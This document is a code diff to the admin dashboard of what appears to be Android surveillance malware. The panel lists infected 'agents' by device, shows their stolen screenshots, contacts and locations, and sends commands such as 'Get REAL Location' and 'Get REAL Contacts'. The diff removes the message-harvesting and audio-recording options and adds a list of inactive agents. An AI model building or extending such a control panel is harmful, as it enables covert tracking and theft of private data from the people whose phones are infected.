@@ -93,7 +93,6 @@
             border-left: 4px solid var(--primary);
         }
         .contact-item { border-left-color: #4CAF50; }
-        .message-item { border-left-color: #2196F3; }
         .location-item { border-left-color: #FF9800; }
         
         /* Responsive */
@@ -117,7 +116,6 @@
             <a href="/admin#agents">📱 Agents</a>
             <a href="/admin#screenshots">🖼️ Screenshots</a>
             <a href="/admin#contacts">👥 Contacts</a>
-            <a href="/admin#messages">💬 Messages</a>
             <a href="/admin#locations">📍 Locations</a>
             <a href="/admin#deploy">🚀 Deploy</a>
             <a href="/admin#commands">⚡ Commands</a>
@@ -141,7 +139,7 @@
         <strong>🔧 Debug Tools:</strong> 
         <a href="/debug/agents">View All Agents</a> | 
         <a href="/debug/screenshots">View All Screenshots</a> | 
-        <a href="/debug/clear_data">Clear All Data</a> |
+        <a href="/debug/clear_data" onclick="return confirm('Are you sure you want to clear ALL data?')">Clear All Data</a> |
         <strong>Total Agents:</strong> {{ all_agents|length }} | 
         <strong>Active Agents:</strong> {{ agents|length }}
     </div>
@@ -159,10 +157,6 @@
         <div class="stat-card">
             <div class="stat-number" style="color: #4CAF50;">{{ stats.total_contacts }}</div>
             <div>Real Contacts</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-number" style="color: #2196F3;">{{ stats.total_messages }}</div>
-            <div>Real Messages</div>
         </div>
         <div class="stat-card">
             <div class="stat-number" style="color: #FF9800;">{{ stats.total_locations }}</div>
@@ -188,7 +182,6 @@
                 <p><strong>First Seen:</strong> {{ agent.first_seen or 'Never' }}</p>
                 <p><strong>Last Seen:</strong> {{ agent.last_seen or 'Never' }}</p>
                 <p><strong>Real Screenshots:</strong> {{ agent.screenshot_count or 0 }}</p>
-                <p><strong>Call Records:</strong> {{ agent.call_records or 0 }}</p>
                 <p><strong>Battery:</strong> 
                     {% if agent.battery_level %}
                         {% if agent.battery_level > 70 %}🟢
@@ -200,7 +193,6 @@
                 </p>
                 <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
                     <a href="/admin/contacts/{{ agent.agent_id }}" class="btn btn-info">👥 Contacts</a>
-                    <a href="/admin/messages/{{ agent.agent_id }}" class="btn btn-info">💬 Messages</a>
                     <a href="/admin/locations/{{ agent.agent_id }}" class="btn btn-info">📍 Locations</a>
                     <a href="/admin/clear_agent/{{ agent.agent_id }}" class="btn btn-danger" 
                        onclick="return confirm('Delete ALL data for agent {{ agent.agent_id }}?')">🗑️ Remove</a>
@@ -211,6 +203,18 @@
         {% else %}
         <div style="text-align: center; padding: 40px; color: #888;">
             <p>No active agents. Deploy agents to see them here!</p>
+            {% if all_agents %}
+            <div style="margin-top: 20px;">
+                <h4>All Registered Agents (Inactive):</h4>
+                {% for agent in all_agents %}
+                {% if agent.status != 'active' %}
+                <div style="background: #3d3d3d; padding: 10px; margin: 5px; border-radius: 5px; border-left: 4px solid #ff4444;">
+                    {{ agent.agent_id }} - {{ agent.status }} - Last: {{ agent.last_seen or 'Never' }}
+                </div>
+                {% endif %}
+                {% endfor %}
+            </div>
+            {% endif %}
         </div>
         {% endif %}
     </div>
@@ -224,7 +228,7 @@
             <div class="screenshot-item">
                 <a href="/media/screenshot/{{ screenshot.id }}" target="_blank">
                     <img src="/media/screenshot/{{ screenshot.id }}" alt="Real Screenshot" class="screenshot-img"
-                         onerror="this.style.background='#2d2d2d'; this.innerHTML='<div style=padding:40px;color:#888>Loading...</div>'">
+                         onerror="this.style.background='#2d2d2d'; this.innerHTML='<div style=padding:40px;color:#888>Image not available</div>'">
                 </a>
                 <div style="margin-top: 10px;">
                     <strong>{{ screenshot.agent_id }}</strong><br>
@@ -256,25 +260,6 @@
         </div>
         {% else %}
         <p style="text-align: center; padding: 20px; color: #888;">No real contacts collected yet. Send 'get_contacts' command!</p>
-        {% endif %}
-    </div>
-
-    <!-- Real Messages Section -->
-    <div class="section" id="messages">
-        <h2>💬 Real Messages ({{ messages|length }})</h2>
-        {% if messages %}
-        <div class="data-grid">
-            {% for message in messages %}
-            <div class="message-item">
-                <strong>{{ message.phone_number }}</strong> 
-                <span style="color: #2196F3; font-size: 0.9em;">({{ message.message_type }})</span><br>
-                <p style="margin: 8px 0;">{{ message.message_text }}</p>
-                <small>Agent: {{ message.agent_id }} | {{ message.timestamp }}</small>
-            </div>
-            {% endfor %}
-        </div>
-        {% else %}
-        <p style="text-align: center; padding: 20px; color: #888;">No real messages collected yet. Send 'get_messages' command!</p>
         {% endif %}
     </div>
 
@@ -314,30 +299,30 @@
         </div>
         
         <h3 style="margin-top: 30px;">Recent Deployments</h3>
-        {% if deployments %}
+        {% if all_agents %}
         <div class="data-table-container">
             <table class="data-table">
                 <thead>
                     <tr>
-                        <th>Target Phone</th>
                         <th>Agent ID</th>
                         <th>Status</th>
-                        <th>Time</th>
-                        <th>Message</th>
+                        <th>First Seen</th>
+                        <th>Last Seen</th>
+                        <th>Device Info</th>
                     </tr>
                 </thead>
                 <tbody>
-                    {% for deployment in deployments %}
+                    {% for agent in all_agents %}
                     <tr>
-                        <td>{{ deployment.target_phone }}</td>
-                        <td>{{ deployment.agent_id }}</td>
+                        <td>{{ agent.agent_id }}</td>
                         <td>
-                            <span class="status-{{ deployment.status }}">
-                                {{ deployment.status|upper }}
+                            <span class="status-{{ agent.status }}">
+                                {{ agent.status|upper }}
                             </span>
                         </td>
-                        <td>{{ deployment.timestamp }}</td>
-                        <td><em>{{ deployment.message_sent[:50] }}...</em></td>
+                        <td>{{ agent.first_seen or 'Never' }}</td>
+                        <td>{{ agent.last_seen or 'Never' }}</td>
+                        <td>{{ agent.phone_model or 'Unknown' }} - {{ agent.android_version or 'Unknown' }}</td>
                     </tr>
                     {% endfor %}
                 </tbody>
@@ -377,9 +362,7 @@
                     <option value="capture_screenshot">📸 Capture REAL Screenshot</option>
                     <option value="get_location">📍 Get REAL Location</option>
                     <option value="get_contacts">👥 Get REAL Contacts</option>
-                    <option value="get_messages">💬 Get REAL Messages</option>
                     <option value="get_device_info">📱 Get REAL Device Info</option>
-                    <option value="record_audio">🎤 Record Audio</option>
                 </select>
             </div>
             <button type="submit" class="btn btn-warning" {% if not all_agents %}disabled{% endif %}>
@@ -461,9 +444,20 @@
         });
 
         // Show notification for new data
-        if ({{ stats.total_screenshots }} > 0 || {{ stats.total_contacts }} > 0 || {{ stats.total_messages }} > 0 || {{ stats.total_locations }} > 0) {
+        if ({{ stats.total_screenshots }} > 0 || {{ stats.total_contacts }} > 0 || {{ stats.total_locations }} > 0) {
             console.log("🎯 REAL surveillance data is being collected!");
         }
+
+        // Update agent status colors
+        document.querySelectorAll('.status-active').forEach(el => {
+            el.style.color = '#4CAF50';
+        });
+        document.querySelectorAll('.status-inactive').forEach(el => {
+            el.style.color = '#f44336';
+        });
+        document.querySelectorAll('.status-pending').forEach(el => {
+            el.style.color = '#ff9800';
+        });
     </script>
 </body>
 </html>
